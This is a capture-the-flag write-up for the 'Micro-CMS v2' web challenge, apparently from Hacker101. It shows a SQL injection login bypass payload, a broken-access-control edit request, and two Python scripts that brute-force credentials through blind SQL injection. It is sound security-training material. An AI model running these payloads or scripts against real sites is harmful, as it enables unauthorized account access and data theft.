# Micro-CMS v2

The website contains 3 flags, we need to find them all.


Landing page is:

>![](imgs/2021-07-16-10-52-50.png)

Seems like they fixed the vulnerabilities of the previous `Micro-CMS v1` challenge.

>![](imgs/2021-07-16-10-54-39.png)


## Flag 0 - SQL injection

We can crash the login page by entering the username `'`

>![](imgs/2021-07-16-11-38-57.png)

We revealed the SQL query used to retrieve the password of the provided `username`, the DB in use (MariaDB) and the language of the web app (python 2.7)

If we send `username=' or '1'='1&password=pass123` we bypass the check on the username but we receive '`Incorrect password`, as the password retrieved from the database doesn't match the password we provide in the form.

We can leverage the `UNION` query to control the password loaded from the database. This password will later be checked against the provided `password` variable in the form.

Since we can control both of them, we can log in without knowing an existing username and password pair.

The POST data we send is:

`username=' UNION SELECT "newpass" #&password=newpass`

and we successfully log in

>![](imgs/2021-07-16-13-22-51.png)

We are assigned a JWT Auth token and the flag can be found in the `Private Page`.




## Flag 1 - Broken access control

Every time we try to edit a post we are redirected to the `login` page because we are required to be authenticated. However, what if we try to directly edit the post with Burp, without following the expected logic flow? It shouldn't be possible if the access to resources is well implemented. But is it?

Not really.

Our request is:

>![](imgs/2021-07-16-11-56-18.png)

And we get the flag in the response:

>![](imgs/2021-07-16-11-57-22.png)


## Flag 2 - Blind SQL injection bruteforce

Once we are logged in, we notice a html comment that suggests us to find the real username and password if we don't have them yet:

```html
<!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do that! -->
```

And this is what we are going to do.


We can exploit the SQL vulnerability further. Here we have a blind SQL vulnerability that we can exploit to extract the username and the password one character at a time.

The condition that allows us to bruteforce the username is the `Invalid password` string that is printed out when the database query returns something.  
We can use the `LIKE` sql statement to make the username match to a certain pattern that we provide. For example we can use it to emulate a `startwith()` function (e.g. `WHERE username LIKE 'a%'` will match all the usernames that start with `a`)

The script we used to bruteforce the username is the following:

```python
import requests
import re

alphabet="abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url= "http://35.190.155.168/44c8933501/login"

username=""

for x in range(0,32):
    print("cicle: "+str(x))
    for letter in alphabet:
        temp = username+letter
        data= {
                "username": "' or username LIKE '{}%".format(temp),
                "password": 'temp'
                }
        page = requests.post(url,data=data)
        # if previous query returns a match -> Invalid password in response
        if re.search("Invalid password",page.text):
            username=temp
            print("MATCH: "+username)
            break
```

We end up with the username `lelah`.

We can now proceed bruteforcing the password, same approach.

```python
import requests
import re

alphabet="abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url= "http://35.190.155.168/44c8933501/login"

password=""

for x in range(0,32):
    print("cicle: "+str(x))
    for letter in alphabet:
        temp = password+letter
        data= {
                "username": "lelah' and password LIKE '{}%".format(temp),
                "password": 'temp'
                }
        page = requests.post(url,data=data)
        # if previous query returns a match -> Invalid password in response
        if re.search("Invalid password",page.text):
            password=temp
            print("MATCH: "+password)
            break
```

Char by char we retrieve the full password: `romaine`.

We can now log in using the recovered username and password.  
The flag is waiting for us right after the login.

>![](imgs/2021-07-16-19-55-43.png)
